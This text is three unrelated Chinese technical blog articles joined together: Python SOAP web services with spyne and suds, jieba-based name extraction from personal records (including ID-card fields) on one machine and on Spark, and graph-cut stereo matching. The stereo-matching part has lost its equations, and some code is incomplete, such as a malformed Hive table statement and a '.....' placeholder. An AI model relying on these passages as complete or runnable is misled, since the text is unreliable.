在 Web Service 中所有的访问都通过 SOAP 访问进行，用 WSDL 定义的接口封装，通过 UDDI 进行目录查找所以SOAP、WSDL 和 UDDI 构成了 Web Service 的三要素。
以下简略介绍这三要素。
SOAP
Simple Object Access Protocol，中文为简单对象访问协议，简称 SOAP。 SOAP 是基于 XML 在分散或分布式的环境中交换信息的简单的协议。允许服务提供者和服务客户经过防 火墙在 INTERNET 进行通讯交互。
最多的情况还是还是绑定在HTTP 协议上面传输。所以，导致大多数人认为SOAP 就是HTTP + XML， 或者认为 SOAP 是 HTTP post 请求的一个专用版本，遵循一种特殊的 XML 消息格式。
WSDL
Web Services Description Language，网络服务描述语言，简称 WSDL。它是一门基于 XML 的语言，用 于描述 Web Services 以及如何对它们进行访问。
UDDI
UDDI Universal Description, Discovery and Integration"，可译为“通用描述、发现与集成服务”，简称 UDDI。 WSDL 用来描述了访问特定的 Web Service 的一些相关的信息，那么在互联网上，或者是在企业的不同 部门之间，如何来发现我们所需要的 Web Service 呢？而 Web Service 提供商又如何将自己开发的 Web Serivce 公布到因特网上呢？这就需要使用到 UDDI 了。

环境搭建
python 使用简单，第三方库丰富，我们搭建好环境，进行一整套web services 程序的开发。
我们使用 python 3.6 这个较新python 版本
python 环境管理的标准为conda 标准，我们使用conda 结合pip 进行开发环境的搭建。
创建conda 环境
conda create --name Web_Services python=3.6
conda activate Web_Services 

导出依赖包
pip freeze > requirements.txt
conda list -e > requirements.txt

依赖包列表
# This file may be used to create an environment using:
# $ conda create --name <env> --file <this file>
# platform: win-64
certifi=2019.6.16=py36_0
lxml=4.3.4=pypi_0
pip=19.1.1=py36_0
python=3.6.8=h9f7ef89_7
pytz=2019.1=pypi_0
setuptools=41.0.1=py36_0
spyne=2.12.16=pypi_0
sqlite=3.28.0=he774522_0
suds-py3=1.3.3.0=pypi_0
vc=14.1=h0510ff6_4
vs2015_runtime=14.15.26706=h3a45250_4
wheel=0.33.4=py36_0
wincertstore=0.2=py36h7fe50ca_0


使用conda 或者pip 批量安装
pip install -r requirements.txt
conda install --yes --file requirements.txt


但是注意，async=False ，这个参数问题在3.7版本中有问题，spyne 库会有报错。因为在Python3.7里async变成了关键字，关键字是不能做变量名的，只要把这个名字改成任意不是关键字的词就好了。

服务端开发
针对Python的WebService开发，最早开发者使用最多的库是soaplib
（官方地址：http://soaplib.github.io/soaplib/2_0/index.html ），
但从其官网可知，其最新版本“soaplib-2.0.0-beta2”从2011年3月发布后就不再进行更新了。
通过阅读soaplib的官方文档，可知其不再维护后已经转向了一个新的项目：rpclib
（官方地址：http://github.com/arskom/rpclib ）
进行后续开发，但在rpclib的readme中，介绍了rpclib已经更名为spyne，并将持续进行更新。
综上，所以选用spyne进行开发了。
服务端样例代码:
https://github.com/arskom/spyne/blob/master/examples/helloworld_soap.py
#!/usr/bin/env python
# -*- encoding: utf-8 -*-
#-------------------------------------------------------------------------------
'''
@Author  :   {SEASON}
@License :   (C) Copyright 2013-2022, {OLD_IT_WANG}
@Contact :   {}
@Software:   PyCharm
@File    :   Web_Services_Test20190708 -- Web_Services
@Time    :   2019/7/11 9:03
@Desc    :

'''
#-------------------------------------------------------------------------------
# !/usr/bin/env python
# -*- coding: utf-8 -*-

"""
preference:
    http://spyne.io/docs/2.10/index.html
    https://github.com/arskom/spyne/blob/master/examples/helloworld_soap.py

This is a simple HelloWorld example to show the basics of writing
a webservice using spyne, starting a server, and creating a service
client.
Here's how to call it using suds:

#>>> from suds.client import Client
#>>> hello_client = Client('http://localhost:8000/?wsdl')
#>>> hello_client.service.say_hello('punk', 5)
(stringArray){
   string[] =
      "Hello, punk",
      "Hello, punk",
      "Hello, punk",
      "Hello, punk",
      "Hello, punk",
 }
#>>>

"""
# Application is the glue between one or more service definitions, interface and protocol choices.
from spyne import Application
# @rpc decorator exposes methods as remote procedure calls
# and declares the data types it accepts and returns
from spyne import rpc
# spyne.service.ServiceBase is the base class for all service definitions.
from spyne import ServiceBase
# The names of the needed types for implementing this service should be self-explanatory.
from spyne import Iterable, Integer, Unicode

from spyne.protocol.soap import Soap11
# Our server is going to use HTTP as transport, It’s going to wrap the Application instance.
from spyne.server.wsgi import WsgiApplication


# step1: Defining a Spyne Service
class HelloWorldService(ServiceBase):
    @rpc(Unicode, Integer, _returns=Iterable(Unicode))
    def say_hello(self, name, times):
        """Docstrings for service methods appear as documentation in the wsdl.
        <b>What fun!</b>
        @param name: the name to say hello to
        @param times: the number of times to say hello
        @return  When returning an iterable, you can use any type of python iterable. Here, we chose to use generators.
        """

        for i in range(times):
            yield u'Hello, %s' % name


# step2: Glue the service definition, input and output protocols
soap_app = Application([HelloWorldService], 'spyne.examples.hello.soap',
                       in_protocol=Soap11(validator='lxml'),
                       out_protocol=Soap11())

# step3: Wrap the Spyne application with its wsgi wrapper
wsgi_app = WsgiApplication(soap_app)

if __name__ == '__main__':
    import logging

    from wsgiref.simple_server import make_server

    # configure the python logger to show debugging output
    logging.basicConfig(level=logging.DEBUG)
    logging.getLogger('spyne.protocol.xml').setLevel(logging.DEBUG)

    logging.info("listening to http://127.0.0.1:8000")
    logging.info("wsdl is at: http://localhost:8000/?wsdl")

    # step4:Deploying the service using Soap via Wsgi
    # register the WSGI application as the handler to the wsgi server, and run the http server
    server = make_server('127.0.0.1', 8000, wsgi_app)
    server.serve_forever()


客户端开发
这方面有两个python 组件可以使用，分别是：

suds-jurko
suds-py3

suds-jurko
pip install suds-jurko
文档
https://bitbucket.org/jurko/suds/wiki/Original%20Documentation
suds-py3
https://github.com/cackharot/suds-py3
pip3 install suds-py3
客户端样例代码
#!/usr/bin/env python
# -*- encoding: utf-8 -*-
#-------------------------------------------------------------------------------
'''
@Author  :   {SEASON}
@License :   (C) Copyright 2013-2022, {OLD_IT_WANG}
@Contact :   {shiter@live.cn}
@Software:   PyCharm
@File    :   Web_Services_Test20190708 -- test_client_suds-py3_eg
@Time    :   2019/7/11 23:45
@Desc    :

'''
#-------------------------------------------------------------------------------


import sys
import os
suds_path = os.path.realpath(os.path.join(os.path.dirname(__file__), '..'))
sys.path.append(suds_path)

from suds.client import Client

def set_log():
    import logging
    logging.basicConfig(level=logging.INFO)
    logging.getLogger('suds.client').setLevel(logging.DEBUG)
    logging.getLogger('suds.transport').setLevel(logging.DEBUG)
    # logging.getLogger('suds.xsd.schema').setLevel(logging.DEBUG)

def call_service(url):
    client = Client(url, username='bob', password='catbob')
    do_call_service(client, url)

def do_call_service(client, url):
    print("Calling: sayHello()")
    result = client.service.sayHello('Username')

    print("Result: %s" % result)
    a = 10.98
    b = 98.83
    print("Calling: add()")
    sum = client.service.add(a, b)
    print("Result: Sum of %f + %f = %f" % (a,b,sum))

    print("Calling: addDate()")
    from datetime import datetime
    import time
    inputDate = datetime.now()
    dt = client.service.addDate(inputDate, 1)
    print("Result: %s" % dt)

def test(url):
    client = Client(url)
    for p in client.sd[0].ports:
        for m, args in p[1]:
            if len(args) == 0:
                print(client.service[0][m]())

if __name__ == '__main__':
    # set_log()
    url = 'http://localhost:8000/?wsdl'
    if len(sys.argv) > 1:
        url = sys.argv[1]

    call_service(url)
    # test('http://dati.meteotrentino.it/service.asmx?WSDL')
    client1 = Client("http://127.0.0.1:8181/soap/infoservice?wsdl", username='bob', password='catbob')
    print(client1.service.getInfo("Bob"))

    # client2 = Client("http://127.0.0.1:8181/soap/infoservice?wsdl", username='bob', password='catbob')
    # print(client2.service.getInfo("Test2"))
    # 
    # client3 = Client("http://127.0.0.1:8181/soap/infoservice?wsdl", username='bob', password='catbob')
    # print(client3.service.getInfo("Test3"))


参考文献
1.《web 接口开发与自动化测试  基于Python语言》
2. https://www.cnblogs.com/guanfuchang/p/5985070.html










目前对中文分词精度影响最大的主要是两方面：未登录词的识别和歧义切分。
据统计：未登录词中中文姓人名在文本中一般只占2%左右，但这其中高达50%以上的人名会产生切分错误。在所有的分词错误中，与人名有关的错误占到了将近90%，这中国人名都是根据人的想法起的名字，有很大的随意性，并且数量巨大，规律也不尽相同。


1.理论简介
命名实体识别(Named Entities Recognition, NER)是自然语言处理(Natural LanguageProcessing, NLP)的一个基础任务。其目的是识别语料中人名、地名、组织机构名等命名实体。由于这些命名实体数量不断增加，通常不可能在词典中穷尽列出，且其构成方法具有各自的一些规律性，因而,通常把对这些词的识别从词汇形态处理(如汉语切分)任务中独立处理，称为命名实体识别。命名实体识别技术是信息抽取、信息检索、机器翻译、问答系统等多种自然语言处理技术必不可少的组成部分。
命名实体是命名实体识别的研究主体，一般包括3大类(实体类、时间类和数字类)和7小类(人名、地名、机构名、时间、日期、货币和百分比)命名实体。评判一个命名实体是否被正确识别包括两个方面：实体的边界是否正确；实体的类型是否标注正确。主要错误类型包括文本正确，类型可能错误；反之，文本边界错误,而其包含的主要实体词和词类标记可能正确。 
    命名实体识别的主要技术方法分为：基于规则和词典的方法、基于统计的方法、二者混合的方法等
1.1基于规则和词典的方法
基于规则的方法多采用语言学专家手工构造规则模板,选用特征包括统计信息、标点符号、关键字、指示词和方向词、位置词(如尾字)、中心词等方法，以模式和字符串相匹配为主要手段，这类系统大多依赖于知识库和词典的建立。基于规则和词典的方法是命名实体识别中最早使用的方法，一般而言，当提取的规则能比较精确地反映语言现象时，基于规则的方法性能要优于基于统计的方法。但是这些规则往往依赖于具体语言、领域和文本风格，编制过程耗时且难以涵盖所有的语言现象，特别容易产生错误，系统可移植性不好，对于不同的系统需要语言学专家重新书写规则。基于规则的方法的另外一个缺点是代价太大，存在系统建设周期长、移植性差而且需要建立不同领域知识库作为辅助以提高系统识别能力等问题。
1.2基于统计的方法
基于统计机器学习的方法主要包括：隐马尔可夫模型(HiddenMarkovMode,HMM)、最大熵(MaxmiumEntropy,ME)、支持向量机(Support VectorMachine,SVM)、条件随机场( ConditionalRandom Fields,CRF)等。
在这4种学习方法中，最大熵模型结构紧凑，具有较好的通用性，主要缺点是训练时间复杂性非常高，有时甚至导致训练代价难以承受，另外由于需要明确的归一化计算，导致开销比较大。而条件随机场为命名实体识别提供了一个特征灵活、全局最优的标注框架，但同时存在收敛速度慢、训练时间长的问题。一般说来，最大熵和支持向量机在正确率上要比隐马尔可夫模型高一些，但是隐马尔可夫模型在训练和识别时的速度要快一些，主要是由于在利用Viterbi算法求解命名实体类别序列的效率较高。隐马尔可夫模型更适用于一些对实时性有要求以及像信息检索这样需要处理大量文本的应用,如短文本命名实体识别。
基于统计的方法对特征选取的要求较高，需要从文本中选择对该项任务有影响的各种特征，并将这些特征加入到特征向量中。依据特定命名实体识别所面临的主要困难和所表现出的特性，考虑选择能有效反映该类实体特性的特征集合。主要做法是通过对训练语料所包含的语言信息进行统计和分析，从训练语料中挖掘出特征。有关特征可以分为具体的单词特征、上下文特征、词典及词性特征、停用词特征、核心词特征以及语义特征等。 
基于统计的方法对语料库的依赖也比较大，而可以用来建设和评估命名实体识别系统的大规模通用语料库又比较少。
1.3混合方法
自然语言处理并不完全是一个随机过程,单独使用基于统计的方法使状态搜索空间非常庞大，必须借助规则知识提前进行过滤修剪处理。目前几乎没有单纯使用统计模型而不使用规则知识的命名实体识别系统，在很多情况下是使用混合方法：
3.1 统计学习方法之间或内部层叠融合。
3.2 规则、词典和机器学习方法之间的融合，其核心是融合方法技术。
在基于统计的学习方法中引入部分规则，将机器学习和人工知识结合起来。
3.3 将各类模型、算法结合起来，将前一级模型的结果作为下一级的训练数据，并用这些训练数据对模型进行训练，得到下一级模型。
这种方法在具体实现过程中需要考虑怎样高效地将两种方法结合起来，采用什么样的融合技术。由于命名实体识别在很大程度上依赖于分类技术,在分类方面可以采用的融合技术主要包括如Voting, XVoting,GradingVa,l Grading等。



2 jieba框架以及算法简介jieba介绍
jieba分词系统，主要实现三个模块，

分词 
  词性标注 
  关键词抽取

以下算法介绍，均参考jieba介绍
2.1分词
jieba基于前缀词典和动态规划方法实现分词，
2.2词性标注
jieba分词是如何对未登录词进行分词呢？
基于汉字成词能力的HMM模型识别未登录词。利用HMM模型进行分词，主要是将分词问题视为一个序列标注（sequence labeling）问题，其中，句子为观测序列，分词结果为状态序列。首先通过语料训练出HMM相关的模型，然后利用Viterbi算法进行求解，最终得到最优的状态序列，然后再根据状态序列，输出分词结果。
e.g.ICTCLAS中的HMM人名识别

1.以“王菲”为例，粗分结果是“始##始, 王, 菲, 末##末,”，很明显，粗分过程并不能识别正确的人名，因为“王菲”这个词并不存在于一元语言模型词典中。 
观测序列

观测序列是我们能看到的显状态序列，这个例子里是“始##始, 王, 菲, 末##末,”。 
之后通过查表，初分等以下几个过程 
隐状态
初始概率
转移概率
发射概率
求解HMM 
通过维特比算法找出最可能的标注序列了。最终标注结果：

始##始, 王, 菲, 末##末, 
  100-*     1-B 4-E  101-*  

模式匹配
对于BE这个标注序列，如何知道里面是否含有人名，含有的是哪种人名呢？这需要通过模式匹配来发现，模式串有：


我们的BE匹配到了BE: 姓+单名这条规则，所以是一个单名人名，最终识别出结果：
王菲

3 单机版实现

本文基于大数据的开源组件实现了两个姓名提取脚本， 
一个单机版，一个spark版本。 主要使用到了python3和jieba分词库，以及部分人工积累的停用词库。
利用hdfs清洗后的结构化数据，在hive中创建外表语句：
create external table name_analysis
(
name string,
idcard string,
src string,
)

PARTITIONED BY (source string)
ROW FORMAT DELIMITED
FIELDS TERMINATED BY ',';
调用脚本
#!/bin/bash
echo "start running the Abstract Name  analysis working ......"
START=$(date +%s);
date=`date -d "$1" "+%Y%m%d"`

echo "running date is $date"

##################################################
##你的数据外表
echo "-------------------start write content to txt-------------------"

hive -f hive_temp.hql -hivevar date=$date>>$date.txt
echo "-------------------content to $date.txt done-----------------------"


###############################################
###abstract name to txt file
echo "------------------start abstract name------------------------------"
python3 abstractNameToFile.py $date.txt
echo "------------------abstract name done-------------------------------"

##############################################
echo "-----------------start put file to hdfs/hive---------------------"
NAME_CONTENT=name_$date.txt

hdfs dfs -put $NAME_CONTENT /HDFS/name_analysis/content


echo "----------------put file to hdfs/hive done ----------------------------"


################################################
END=$(date +%s);
echo 'running time is: '
echo $((END - START))| awk '{print int($1/3600)":"int($1%3600/60)":"int($1%3600%60)}'
python3分词脚本

# -*- coding: utf-8 -*-
import jieba
import jieba.posseg as pseg
import datetime
import sys


#词性标注，nr为人名
def getFirstName(messageContent):
    words = pseg.cut(messageContent)
    for word, flag in words:
        if flag == 'nr'and len(word)>1:#单字姓名去掉
            return word

    return False

def getAllName(messageContent):
    words = pseg.cut(messageContent)
    names = []
    for word, flag in words:
        print('%s,%s' %(word,flag))
        if flag == 'nr':#人名词性为nr
            names.append(word)
    return names

#修改停用词集合中所有词性为名词，大部分为名词
def alterWordTagToX(list):
    for x in list:
        jieba.add_word(x, tag='n')

def LoadStopWord(StopWordFileName):
    StopWord_file = open(StopWordFileName, 'r', encoding='utf-8')
    StopWordList = []

    for line in StopWord_file.readlines():
        StopWordList.append(line.strip('\n'))

    set(StopWordList)
    StopWord_file.close()
    alterWordTagToX(StopWordList)

def main():
    #加载停用词词典文件
    LoadStopWord('stopword.txt')

    input_file_name = sys.argv[1]
    output_file_name = 'name_'+ input_file_name
    print(input_file_name)  
    print(output_file_name)
    begin = datetime.datetime.now()
    #单机并行分词
    jieba.enable_parallel(8)
    input_file = open(input_file_name, 'r', encoding='utf-8')
    output_file = open(output_file_name, 'w')

    for line in input_file:
        temp = line.split('\t')
        if len(temp)!=4:
            continue
        name = getFirstName(temp[1])

        if name != False:
            #print(name)姓名作为一行中的一个字段，其他为你需要的字段
            time = str(temp[3]).strip('\n') 
            output_file.write(temp[0] + ','+ name + ','+ '\n')
        else:
            continue

    end = datetime.datetime.now()
    print((end - begin).seconds)

#单元测试代码
    names = getAllName('我老公宝贝叫王宁,尊敬的王大力,CCHHKK旗舰店,尊敬的铁路客服人员李天，冯达辉')
    print(names)
    print(getFirstName('尊敬的铁路客服人员李天'))
    output_file.close()
    input_file.close()


if __name__ =='__main__':
    main()

 
 
停用词文件举例
 
人名提取的结果示例

4.spark分布式版本
4.1分布式环境搭建
4.1.1 spark环境搭建
略
4.1.2 分布式环境下，分词库的安装
每个节点jieba库的安装，在一个节点配置好免密登录后可使用如下脚本进行jieba库的批量安装
for((i=2;i<=xxx;i++));do ssh host-${i} "hostname; mkdir /opt/python;";done
for((i=2;i<=xxx;i++));do scp /opt/jieba-0.38.zip root@host-${i}:/opt/python;done
for((i=2;i<=xxx;i++));do ssh host-${i} "hostname; unzip /opt/python/jieba-0.38.zip;";done
for((i=2;i<=xxx;i++));do ssh host-${i} "hostname; mv ~/jieba-0.38 /opt/python;";done
for((i=2;i<=xxx;i++));do ssh host-${i} "hostname; cd /opt/python/jieba-0.38;python setup.py install";done


4.2 分布式分词要点
4.2.1 如何保障每个节点都能加载停用词：
spark有两个技术可以保证：

1.全局变量Broadcast   spark文档 
  A broadcast variable that gets reused across tasks. 
  A broadcast variable created with SparkContext.broadcast(). Access its value through value.

class pyspark.Broadcast(sc=None, value=None, pickle_registry=None, path=None)
A broadcast variable created with SparkContext.broadcast(). Access its value through value.

Examples:

>>> from pyspark.context import SparkContext
>>> sc = SparkContext('local', 'test')
>>> b = sc.broadcast([1, 2, 3, 4, 5])
>>> b.value
[1, 2, 3, 4, 5]
>>> sc.parallelize([0, 0]).flatMap(lambda x: b.value).collect()
[1, 2, 3, 4, 5, 1, 2, 3, 4, 5]
>>> b.unpersist()
>>> large_broadcast = sc.broadcast(range(10000))

2.sc.addFile(path)添加可分发的文件  spark文档 
  addFile(path, recursive=False) 
  Add a file to be downloaded with this Spark job on every node. The path passed can be either a local file, a file in HDFS (or other Hadoop-supported filesystems), or an HTTP, HTTPS or FTP URI.

To access the file in Spark jobs, use L{SparkFiles.get(fileName)
4.2.2 使用spark-submit 提交姓名提取脚本
在命令行调用：(后面还可以根据自己的集群添加其他选项)
    spark-submit SparkAbstractName.py
基于python2的pyspark脚本，本来想统一成python3的但是集群是生存环境不好更改，只好用系统自带的python2了，因为jieba库是python2，3都兼容的，这一点向作者致敬。
# -*- coding: utf-8 -*-
from pyspark import SparkConf,SparkContext
from pyspark import SparkFiles
import jieba
import jieba.posseg as pseg
import datetime
import os
import sys
reload(sys)
sys.setdefaultencoding('utf-8')


#word tagging，nr for name
def getFirstName(messageContent):
    words = pseg.cut(messageContent)
    for word, flag in words:
        if flag == 'nr'and len(word)>1:#delete single name
            return word

    return False



#alter stopName's property to N
def alterWordTagToX(list):
    for x in list:
        jieba.add_word(x, tag='n')

#load local stopName
def LoadStopWord(StopWordFileName):
    with  open(StopWordFileName, 'r') as StopWord_file:
        StopWordList = []

        for line in StopWord_file.readlines():
            StopWordList.append(line.strip('\n'))

        set(StopWordList)
        alterWordTagToX(StopWordList)
        return StopWordList

def Abstractfunc(line):
    LoadStopWord(SparkFiles.get('stopName.txt'))
    name = getFirstName(line[3])
    if name != False:#对原始数据的重新排列
        return [line[1],name,'',line[2],line[0]]
    else:
        return [line[1],'0','',line[2],line[0]]


def main(sc):

    #print(LoadStopWord(SparkFiles.get("stopName.txt")))
    input_file = sc.textFile('''file:///name_analysis/test.txt''')

    begin = datetime.datetime.now()
    length =  input_file.map(lambda s:len(s)).reduce(lambda a,b:a+b)
    print(length)
    #加载，分割的原始数据
    content_list = input_file.map(lambda x: x.split(','))
    #获取我需要的列
    row_content = content_list.map(lambda x:(x[8],x[9],.....))
    print(row_content.map(lambda s:len(s)).reduce(lambda a,b:a+b))
    #数据清洗，分词
    list_content = row_content.map(lambda x:(list(x))).filter(lambda x:x[1]!='0')
    result_content = list_content.map(lambda line:(Abstractfunc(line))).filter(lambda x:x[1]!='0')
    print(list_content.map(lambda s:len(s)).reduce(lambda a,b:a+b))

    #获取样例数据
    test  = result_content.take(10)
    for x in test:
        print (x[1])
        print(type(x))

    '''
    jieba.enable_parallel(8)
    input_file = open(input_file_name, 'r', encoding='utf-8')
    output_file = open(output_file_name, 'w')

'''
    end = datetime.datetime.now()
    print((end - begin).seconds)

#unit test
'''
    ......
'''

if __name__ =='__main__':
    conf = SparkConf().setAppName("SparkAbstractName")
    sc = SparkContext(conf = conf)
    sc.setLogLevel("WARN")
    path = os.path.join(os.getcwd(), '''stopName.txt''')
    print(os.getcwd())
    print(path)
    sc.addFile(path)
    main(sc)
    sc.stop()

未完待续。。。
参考文献
1.http://blog.csdn.net/lalalawxt/article/details/55804384 
2.http://www.cnblogs.com/yuxc/archive/2012/01/11/2319631.html 
3.臧勇真. 基于统计和规则的中文人名识别研究与实现[D]. 西南交通大学, 2013. 
4.jieba介绍   http://www.cnblogs.com/zhbzz2007/p/6076246.html 
5.spark文档   http://spark.apache.org/docs/latest/api/python/pyspark.html 
6.文本情感分析 https://www.ibm.com/developerworks/cn/cognitive/library/cc-1606-spark-seniment-analysis/index.html 
7.ICTCLAS中的HMM人名识别 
http://www.hankcs.com/nlp/segment/ictclas-the-hmm-name-recognition.html 
8.实战HMM-Viterbi角色标注中国人名识别 
http://www.hankcs.com/nlp/chinese-name-recognition-in-actual-hmm-viterbi-role-labeling.html 









1.绪论
立体匹配是三维重建系统的关键步骤，并且作为一种非接触测量方法在工业以及科研领域具有重要的应用价值。为了完成匹配工作以及获取场景的稠密视差图，可以通过构建能量函数对应立体匹配的约束条件。复杂能量函数的全局最优解通常是NP难问题。相对于其他全局优化算法相比如模拟退火、梯度下降、动态规划等，图割算法不仅精度高，收敛速度快，并且对于光照变化、弱纹理等区域的匹配效果也比其他算法好。
2.图割算法
计算机视觉领域的大部分问题可以转换为标号问题，在立体匹配中视差的求解就是对图像的像素在视察范围内的离散标号问题。离散标号的最优解问题可以采用能量函数的最小化来求解，图割做为一种可以求解能量最小化问题的算法，在计算机视觉领域的应用非常广泛，如图像分割，图像恢复，立体匹配等。
Kolmogorov指出了如何将能量函数最小化问题与立体视差计算联系起来。通常使用图割算法进行立体匹配分为三个步骤，建立网络图，图割算法求解，生成视差图。图割算法由于其全局优化的特性能够获取效果良好的稠密视差图，但是对于处理高分辨率图像其运算量过大，为了降低运算量，一般思路都是采用分割后的图像缩小网络图的规模从而降低计算量。然而由于采用自动化非交互的彩色图像分割方法会把相同视差的区域分开或隐去了图像的部分细节信息，导致分割误差，而消除误差需要引入其他方法，如通过引入初试视差估计等方法，但这些方法增加了立体匹配算法的整体复杂度，而且没有有效利用分割信息。
在实际应用场景中为了获取感兴趣区域的精细视差图，针对于以往基于图像分割的立体匹配算法复杂、计算量大，没有充分利用分割结果的信息等缺点，本文提出了一种基于图像分割的立体匹配方法。该方法在图像分割时采用可交互的图割方法获得感兴趣目标，只针对感兴趣目标进行立体匹配，因此运算量大大减少，同时保留了原有图割算法具有的全局最优特性。
2.1 能量函数
使用图割算法进行立体匹配的过程中，需要将图割中的网络图和能量函数对应起来。能量函数定义为： 
 
  该能量函数的四项分别为数据项，遮挡项，平滑项，唯一项。每一项都表征匹配时待处理的问题。

1)数据项： 
数据项是为了让算法获取最佳的像素匹配，像素之间的色彩相似度越高，数据项的值越小。 
 
其中函数D(a)用来表征匹配像素p，q之间的不相似性，a = (p,q)表示如果p，q像素匹配，数据项约束生效并可以按照下式：进行展开计算。 

2)遮挡项 
遮挡项的作用依然是为了将匹配像素个数最大化，对于存在遮挡无法匹配的像素按照下式乘以惩罚系数，由公式可知遮挡像素越少，遮挡项的值越小。 

3)平滑项 
平滑项主要衡量的内容是对于临近像素一般具有相似性特别是色彩相似这一特点，对于像素p而言其邻接像素p1和p2应该具有相同的视差分配。 
 
平滑项一般采用分段函数。其中可以按照距离度量展开成分段函数。平滑项的值越低意味着临近像素的视差越相近。
4)唯一项 
唯一项专注于立体匹配的唯一性约束，若待匹配点出现了不止一个匹配的情况则将惩罚值设置为无穷大。下式为其数学表达 


2.2 网络流
（一）最大流 
    对于带有源点S和汇点T的有向图，称为网络图。在网络图中设f是定义在集合E上的非负函数。用fij表示f在弧e = (vi,vj)上的值，即为弧e上从vi到vj的流量称为网络流。网络流fij满足下列两个条件：

1.流量Fij不超过弧的容量Cij，
2.对于任意顶点vi，从vi留出的流量等于从vi流入的流量。即： 
 
满足上述条件的所有网络流中流量最大的一个，称为最大流。  

（二）最小割 
    网络图中一个S-T的割意味着将顶点集分为两部分，。割的代价为顶点集到所有割边的容量和，容量和最小的割称为最小割。设x 和y 是顶点集V中的两个顶点，(x,y)表示从x 到y 的一条边，其边的权值表示为c(x,y)。因此对于图G=(v,e)其一个割可以表示为：
 
Ford 和 Fulkerson 早在1962年证明了最大流和最小割的等价对应关系。通过求网络图的最大流来等价其最小割，进而可以获取此最小割对应能量函数的全局最小值。一个值得注意的工作为Boykov等人提出的基于图割理论有效的能量函数优化方法。在该方法中，作者提出标号函数的两种比较大的移动，扩张移动 
(expansion moves)和交换移动(swap moves)，并证明了其扩张算法所获得的局部小和全局小相差一个已知的常数，而交换算法可以处理更一般的能量函数形式。本文使用扩张移动算法。
3.立体匹配网络图的构造
在使用图割算法进行立体匹配过程中首先需要构建网络图，对于上文提到的网格图由节点和连接节点的有向边组成。源点S，汇点T为两个特殊节点。边分为两种，一种视差边，一种是平滑边。视差边对应于能量函数(公式(1))第1项，平滑边对应于能量函数第2项。 
    网格图的具体构建过程如下：

1.建立3维坐标系O-XYZ，把图像置于OXY平面，得的原点，X轴、Y轴与OXY平面的原点以及相应的轴重合。
2.在Z轴的正半轴上，从原点开始等距离的放置向量了l1,l2,…ln，在l1即原点O的地方放置q0，对于i=1,2,…n-1在li和li+1的中点放置点qi，最后在ln处放置qn。

至此，由OXY平面中像素点p=(px,py)以及Z的正半轴上点q0,q1,…qn构成了一个立方体网格。我们可以知道，对i=1,2,…n-1，在Z轴上的每个区间[qi,qi+1]恰好包含一个li+1。记(p,qi)=:(px,py,qi)为立方体网格上的节点，N(P)为像素点P的邻域。在网络图两端分别添加两个节点，即源点S，汇点T。并在S到I1中每个属于左视图分割模版(图(1))中标记为前景的像素点之间添加一个边，在T到集合即立方体网络上与OXY平面相对的另一个面上的节点，添加到汇点的边。由此，获得一个无向图G=< v,e >即：

则网络图中各边的容量为：

(1)源点，汇点连接边的容量为：汇点链接边的容量



(2)视差边的容量为：对任意，边的容量为： 
 
在对视差边的处理上，视差边对应能量函数的数据项，既(1)式的第一项，在彩色图像中我们对RGB三通道分开处理，再求加权平均，这样保留了颜色信息，结果更加精准，特别的，为了更进一步的准确，本文采用线性最近邻插值算法添加了亚像素信息。上式可以扩展为：

 
为彩色图像各个通道的权值，可取0.29，0.11，0.58，或者0.33。

(3)光滑边的容量：p, q为衣服图像中相邻两像素： 
 
于是网络图构建完成，如图所示： 


4.基于图割算法的图像分割
本文以图割算法为基本框架，采用基于图像分割的办法来实现对于感兴趣物体的立体匹配。由于彩色图像分割算法会影响到后期立体匹配的结果，所以选取合适的分割算法非常重要。
基于自动化非交互的分割方法可能会把相同视差的区域分开或者隐去了图像的部分细节信息，这就造成了误差，而消除误差需要引入其他方法，如通过引入局部匹配算法为分割模版提供初试视差估计等方法，但这些方法提升了立体匹配算法的整体复杂度，而且没有有效利用分割信息。所以本文采用基于图割算法的图像分割，在构建立体匹配网络图的同时进行图像分割。
在图像分割问题中我们定义如下的能量函数形式： 

传统基于图割算法的图像分割将上式映射为求解对应加权图的最大流/最小割问题，对于低分辨率的简单图像交互分割效果良好但是计算复杂度较高，内存开销大。为了提高分割速度并且适用于高分辨率图像，将图像分割融入立体匹配的流程中。本文采用文献[22]中的方法，通过添加辅助索引节点，并使用新的能量函数形式：  

加速分割并减少运算量。公式(5)数据项中跟表示前景物体跟背景的非归一直方图，平滑项中 
，为图像中所有⊿I的均值。该方法简化了图割计算时间，并且得到了非常精准的分割结果。如下所示(蓝色种子点用来标记背景，红色种子点用来标记前景)：








baby1左视图种子点设置
左视图分割结果






baby1右视图种子点设置
右视图分割结果


5.图割算法立体匹配
在立体匹配问题中，视差图的标号问题可以等价为全局能量函数的最小化求值问题，通常表示为Greig能量函数形式 
 
在图1中，点表示源点，点表示汇点，视差边对应于能量函数式（1）中的第一项，平滑边对应于能量函数第二项。求解式（1）的能量函数的最小值可以等价为求解图的最小割问题，获得全局最优的视差图。
为了减少立体匹配的运算量，本文根据图像分割的结果得到感兴趣物体与分割模版，由分割模版构建网络图，使用图割算法进行立体匹配，有效利用了分割信息。综上所述本文算法可以概括为两大步骤：1感兴趣目标的提取，2利用网络图进行立体匹配。算法流程图如图2所示：
 
Figure 2 Flow chart of the Algorithm
本文相对于传统方法，根据每个像素构建网络图的算法有所不同。对于图，在两端分别添加源点，汇点之后，只在到中每个属于左视图分割模版中标记为目标的像素点之间添加边，在T到集合即立方体网络上与平面相对的另一个面上的节点，添加对应到汇点的边。通过上述方法，可以大大减少计算量。
为了进一步优化匹配结果，本文在对网络图中视差边的处理上，针对彩色图像采用RGB三通道分开处理，用线性最近邻插值算法在图像的横坐标方向添加了亚像素信息。即将(2)式扩展为： 
 
式中为彩色图像各个通道的权值。 
按照上述的方法法构造网络图，并给各个边赋相应的权值，采用基于增广路的最大流算法求解，得到全局最小值，即为最优视差匹配。
参考文献
[16]Boykov Y, Kolmogorov V. An experimental comparison of min-cut/max-flow algorithms for energy minimization in vision[J]. IEEE Transactions on Pattern Analysis and Machine Intelligence, 2004, 26(9): 1124-1137. 
[19]Roy S, Cox I J. A maximum-flow formulation of the n-camera stereo correspondence problem[A]// IEEE International Conference on Computer Vision[A], 1998 January 4-7, Bombay India:492-499. 
[20]Hong L, Chen G. Segment-based stereo matching using graph cuts[A]// IEEE Conference on Computer Vision and Pattern Recognition[C],2004 June 27-July 2,Washington DC USA:74-81. 
[23]Tang M, Gorelick L, Veksler O, et al. GrabCut in One Cut[A]// IEEE International Conference on Computer Vision[C], 2013 Dec 01 - 08, Sydney, Australia  1769-1776. 
[24]王年, 范益政, 鲍文霞等. 基于图割的图像匹配算法[J]. 电子学报, 2006, 34(2):232-236. 
